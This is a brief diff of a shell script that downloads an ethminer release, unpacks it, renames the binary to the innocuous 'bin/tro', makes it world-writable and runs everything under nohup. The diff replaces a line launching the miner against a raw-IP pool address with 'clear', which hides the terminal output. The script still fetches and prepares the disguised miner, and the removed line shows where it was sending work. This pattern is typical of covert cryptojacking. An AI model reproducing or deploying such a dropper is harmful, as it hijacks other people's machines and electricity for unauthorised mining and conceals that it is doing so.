@@ -2,4 +2,5 @@ nohup wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0
 nohup tar -xvf out
 nohup mv bin/ethminer bin/tro
 nohup chmod 777 bin/tro
-nohup bin/tro -P http://79.231.42.249:80
+clear
+
